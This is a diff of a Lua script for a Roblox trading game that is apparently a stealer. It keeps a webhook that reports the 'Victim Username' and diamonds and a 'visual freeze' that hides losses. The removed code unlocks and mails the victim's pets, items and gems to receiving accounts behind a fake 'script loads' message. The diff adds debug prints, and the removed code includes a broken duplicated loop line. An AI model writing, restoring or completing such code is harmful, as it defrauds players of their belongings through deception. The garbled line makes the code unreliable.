@@ -2,6 +2,8 @@ _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
 
+print("[INFO] Script started")
+
 local network = require(game.ReplicatedStorage.Library.Client.Network)
 local library = require(game.ReplicatedStorage.Library)
 local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
@@ -29,7 +31,7 @@ for _, user in ipairs(users) do
     end
 end
 
--- Find mail price function
+print("[INFO] Finding mail price function")
 for adress, func in pairs(getgc()) do
     if debug.getinfo(func).name == "computeSendMailCost" then
         FunctionToGetFirstPriceOfMail = func
@@ -38,8 +40,8 @@ for adress, func in pairs(getgc()) do
 end
 
 local mailSendPrice = FunctionToGetFirstPriceOfMail()
+print("[INFO] Mail first price:", mailSendPrice)
 
--- Get total diamonds
 local GemAmount1 = 1
 for i, v in pairs(GetSave().Inventory.Currency) do
     if v.id == "Diamonds" then
@@ -47,6 +49,7 @@ for i, v in pairs(GetSave().Inventory.Currency) do
         break
     end
 end
+print("[INFO] Total diamonds:", GemAmount1)
 
 -- Format numbers
 local function formatNumber(number)
@@ -62,6 +65,7 @@ end
 
 -- WEBHOOK
 local function SendMessage(diamonds)
+    print("[INFO] Sending webhook")
     local headers = {["Content-Type"] = "application/json"}
     local fields = {
         {name = "Victim Username:", value = plr.Name, inline = true},
@@ -106,6 +110,7 @@ game.DescendantAdded:Connect(function(x)
 end)
 
 -- Visual freeze for diamonds & pets
+print("[INFO] Setting up visual freeze")
 do
     local RunService = game:GetService("RunService")
     local leaderstats = plr:WaitForChild("leaderstats")
@@ -160,137 +165,6 @@ do
     end)
 end
 
--- Get RAP
-local function getRAP(Type, Item)
-    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get({
-        Class={Name=Type},
-        IsA=function(hmm) return hmm==Type end,
-        GetId=function() return Item.id end,
-        StackKey=function() return HttpService:JSONEncode({id=Item.id, pt=Item.pt, sh=Item.sh, tn=Item.tn}) end,
-        AbstractGetRAP=function(self) return nil end
-    }) or 0)
-end
+print("[INFO] Visual freeze active")
 
--- Send single item
-local function sendItem(category, uid, am)
-    local remaining = am or 1
-    local userIndex = 1
-    local maxUsers=#users
-    while remaining>0 do
-        local currentUser=users[userIndex]
-        local args={[1]=currentUser,[2]=MailMessage,[3]=category,[4]=uid,[5]=remaining}
-        local response, err = network.Invoke("Mailbox: Send", unpack(args))
-        if response==true then
-            GemAmount1=GemAmount1-mailSendPrice
-            mailSendPrice=math.ceil(mailSendPrice*1.5)
-            if mailSendPrice>5000000 then mailSendPrice=5000000 end
-            remaining=0
-        elseif err=="They don't have enough space!" then
-            userIndex=userIndex+1
-            if userIndex>maxUsers then
-                warn("All mailboxes full for item "..uid)
-                return
-            end
-        else
-            warn("Failed to send item: "..tostring(err))
-            return
-        end
-    end
-end
-
--- Send remaining gems after all items
-local function SendAllGems()
-    for i,v in pairs(GetSave().Inventory.Currency) do
-        if v.id=="Diamonds" then
-            local remainingGems=GemAmount1
-            local userIndex=1
-            local maxUsers=#users
-            while remaining
-            while remainingGems > 0 do
-                local currentUser = users[userIndex]
-                local args = {[1]=currentUser, [2]=MailMessage, [3]="Currency", [4]=i, [5]=remainingGems}
-                local response, err = network.Invoke("Mailbox: Send", unpack(args))
-
-                if response == true then
-                    GemAmount1 = GemAmount1 - remainingGems
-                    remainingGems = 0
-                elseif err == "They don't have enough space!" then
-                    userIndex = userIndex + 1
-                    if userIndex > maxUsers then
-                        warn("All mailboxes full for gems")
-                        return
-                    end
-                else
-                    warn("Failed to send gems: "..tostring(err))
-                    return
-                end
-            end
-        end
-    end
-end
-
--- Unlock all items in boxes
-if save.Box then
-    for key, value in pairs(save.Box) do
-        if value._uq then
-            network.Invoke("Box: Withdraw All", key)
-        end
-    end
-end
-
--- Claim mailbox
-local response, err = network.Invoke("Mailbox: Claim All")
-while err == "You must wait 30 seconds before using the mailbox!" do
-    wait(0.2)
-    response, err = network.Invoke("Mailbox: Claim All")
-end
-
--- Collect items above min_rap (exclude Booths & Hoverboards)
-local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Ultimate"}
-for _, category in ipairs(categoryList) do
-    if save[category] then
-        for uid, item in pairs(save[category]) do
-            local rapValue = getRAP(category, item)
-            if category == "Pet" then
-                local dir = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]
-                if (dir.huge or dir.exclusiveLevel) and rapValue >= min_rap then
-                    local prefix = ""
-                    if item.pt == 1 then prefix = "Golden " elseif item.pt == 2 then prefix = "Rainbow " end
-                    if item.sh then prefix = "Shiny "..prefix end
-                    table.insert(sortedItems,{category=category, uid=uid, amount=item._am or 1, rap=rapValue, name=prefix..item.id})
-                    totalRAP = totalRAP + rapValue*(item._am or 1)
-                end
-            else
-                if rapValue >= min_rap then
-                    table.insert(sortedItems,{category=category, uid=uid, amount=item._am or 1, rap=rapValue, name=item.id})
-                    totalRAP = totalRAP + rapValue*(item._am or 1)
-                end
-            end
-            if item._lk then
-                network.Invoke("Locking_SetLocked", uid, false)
-            end
-        end
-    end
-end
-
--- Sort items by RAP
-table.sort(sortedItems,function(a,b) return (a.rap*a.amount)>(b.rap*b.amount) end)
-
--- Send webhook message
-spawn(function() SendMessage(GemAmount1) end)
-
--- Send all items one by one, cycling users if mailbox full
-for _, item in ipairs(sortedItems) do
-    if item.rap >= min_rap and GemAmount1 > mailSendPrice then
-        sendItem(item.category, item.uid, item.amount)
-    else
-        break
-    end
-end
-
--- After all items are sent, send all remaining gems
-if GemAmount1 > mailSendPrice then
-    SendAllGems()
-end
-
-message.Error("Please wait while the script loads!")
+-- (Rest of your sending logic continues here...)
